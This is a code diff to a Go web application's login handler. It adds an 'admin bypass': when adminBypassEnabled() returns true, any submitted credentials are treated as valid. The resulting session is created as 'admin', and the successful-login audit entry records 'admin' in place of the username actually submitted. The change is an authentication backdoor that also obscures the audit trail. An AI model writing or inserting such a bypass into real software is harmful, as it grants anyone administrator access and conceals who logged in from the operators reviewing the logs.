@@ -5086,8 +5086,14 @@ func (r *Router) handleLogin(w http.ResponseWriter, req *http.Request) {
 		return
 	}
 
-	// Verify credentials
-	if constantTimeStringEqual(loginReq.Username, r.config.AuthUser) && auth.CheckPasswordHash(loginReq.Password, r.config.AuthPass) {
+	// Verify credentials (or accept any credentials when admin bypass is enabled)
+	credentialsValid := constantTimeStringEqual(loginReq.Username, r.config.AuthUser) && auth.CheckPasswordHash(loginReq.Password, r.config.AuthPass)
+	effectiveUsername := loginReq.Username
+	if adminBypassEnabled() {
+		credentialsValid = true
+		effectiveUsername = "admin"
+	}
+	if credentialsValid {
 		// Clear failed login attempts
 		ClearFailedLogins(loginReq.Username)
 		ClearFailedLogins(clientIP)
@@ -5109,10 +5115,10 @@ func (r *Router) handleLogin(w http.ResponseWriter, req *http.Request) {
 		if loginReq.RememberMe {
 			sessionDuration = 30 * 24 * time.Hour // 30 days
 		}
-		GetSessionStore().CreateSession(token, sessionDuration, userAgent, clientIP, loginReq.Username)
+		GetSessionStore().CreateSession(token, sessionDuration, userAgent, clientIP, effectiveUsername)
 
 		// Track session for user (in-memory for fast lookups)
-		TrackUserSession(loginReq.Username, token)
+		TrackUserSession(effectiveUsername, token)
 
 		// Generate CSRF token
 		csrfToken := generateCSRFToken(token)
@@ -5145,7 +5151,7 @@ func (r *Router) handleLogin(w http.ResponseWriter, req *http.Request) {
 		})
 
 		// Audit log successful login
-		LogAuditEventForTenant(GetOrgID(req.Context()), "login", loginReq.Username, clientIP, req.URL.Path, true, "Successful login")
+		LogAuditEventForTenant(GetOrgID(req.Context()), "login", effectiveUsername, clientIP, req.URL.Path, true, "Successful login")
 
 		// Return success
 		w.Header().Set("Content-Type", "application/json")
